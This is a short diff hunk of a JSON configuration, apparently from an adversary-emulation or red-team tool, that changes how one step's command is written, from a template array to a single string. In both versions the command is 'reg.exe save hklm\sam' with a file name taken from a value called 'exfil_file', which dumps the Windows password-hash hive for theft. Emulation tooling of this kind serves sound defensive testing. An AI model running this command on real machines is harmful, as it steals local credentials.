@@ -216,16 +216,7 @@
                 "target": "self.target_1"
             },
             "tune": {
-                "command": {
-                    "template": [
-                        "reg.exe save hklm\\sam",
-                        {
-                            "kind": "slice",
-                            "slice": 0,
-                            "value": "self.exfil_file"
-                        }
-                    ]
-                }
+                "command": "reg.exe save hklm\\sam${{'kind': 'slice', 'slice': 0, 'value': 'self.exfil_file'}}"
             }
         },
         {
